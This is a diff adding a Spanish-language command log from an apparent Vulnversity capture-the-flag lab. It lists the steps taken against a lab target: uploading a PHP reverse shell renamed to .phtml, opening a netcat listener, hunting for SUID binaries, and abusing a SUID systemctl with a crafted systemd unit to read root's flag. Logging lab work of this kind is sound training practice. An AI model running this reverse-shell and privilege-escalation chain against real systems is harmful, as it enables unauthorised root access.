@@ -1,0 +1,23 @@
+# Vulnversity sesión de explotación del 07/10/2026
+# Transcripción de comandos visibles en capturas; no es historial exportado.
+# Objetivo 10.66.149.123; AttackBox 10.66.165.144.
+cp /usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php shell.phtml
+nano shell.phtml
+nc -lvnp 4444
+cd /home
+ls
+cd bill
+cat user.txt
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+# Unidad temporal de systemd utilizada en la prueba del laboratorio:
+e=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/bandera_root.txt; chmod 777 /tmp/bandera_root.txt"
+[Install]
+WantedBy=multi-user.target' > $e
+/bin/systemctl link $e
+/bin/systemctl enable --now $e
+cat /tmp/bandera_root.txt
+# Hashes calculados sobre los valores obtenidos, sin salto de línea.
+# Las flags y las salidas que las contienen se omiten de esta bitácora.
